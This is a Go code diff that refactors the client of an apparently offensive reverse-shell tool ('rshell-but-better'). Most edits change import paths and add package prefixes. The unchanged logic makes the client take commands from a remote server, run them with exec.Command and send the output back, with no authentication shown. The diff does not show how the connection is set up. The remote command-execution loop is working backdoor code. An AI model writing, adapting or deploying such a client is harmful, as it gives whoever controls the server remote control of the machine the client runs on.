@@ -9,7 +9,7 @@ import (
 	"syscall"
 	"time"
 
-	. "../network"
+	"github.com/ShubhamVG/rshell-but-better/internal/network"
 )
 
 // ============================Exportables==========================
@@ -28,13 +28,12 @@ func NewClient(addr, port string) (Client, error) {
 
 func (client *Client) Communicate() {
 	defer client.tryNotifyAndClose()
-	defer println("Works")               // DEBUG
-	client.Conn.SetDeadline(time.Time{}) // This returns an error but idk what to do with it
+	client.Conn.SetDeadline(time.Time{})
 	go client.handleReceives()
 
 	// Prevents the process from exiting right away
 	sig := make(chan os.Signal, 1)
-	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
+	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
 	<-sig
 }
 
@@ -52,35 +51,35 @@ func (client *Client) handleReceives() {
 			continue
 		}
 
-		receivedReq := ParseIntoRequest(buffer[:n])
+		receivedReq := network.ParseIntoRequest(buffer[:n])
 		client.processRequestAndSendResponse(receivedReq)
 	}
 }
 
-func (client *Client) processRequestAndSendResponse(req Request) {
+func (client *Client) processRequestAndSendResponse(req network.Request) {
 	switch req.Status {
-	case PING:
-		// TODO
-	case REQUESTING_CLOSE:
+	case network.PING:
+		println("Ping received.") // DEBUG
+	case network.REQUESTING_CLOSE:
 		os.Exit(0)
-	case REDIRECT:
+	case network.REDIRECT:
 		// TODO
 		// Maybe freeze all goroutines till it redirects successfully
-	case EXECUTE:
+	case network.EXECUTE:
 		rawCommand := strings.TrimSuffix(req.Payload, "\n")
 		command, params := parseIntoCommandAndParams(rawCommand)
 		out, err := exec.Command(command, params...).Output()
 
 		if err != nil {
-			client.send(OUTPUT_WITH_ERROR, out)
+			client.send(network.OUTPUT_WITH_ERROR, out)
 		} else {
-			client.send(OUTPUT, out)
+			client.send(network.OUTPUT, out)
 		}
 	}
 }
 
 func (client *Client) send(
-	statusCode StatusCode,
+	statusCode network.StatusCode,
 	bytes []byte,
 ) error {
 	payload := []byte{statusCode}
@@ -94,6 +93,6 @@ func (client *Client) send(
 }
 
 func (client *Client) tryNotifyAndClose() {
-	client.Conn.Write([]byte{REQUESTING_CLOSE})
+	client.Conn.Write([]byte{network.REQUESTING_CLOSE})
 	os.Exit(0)
 }
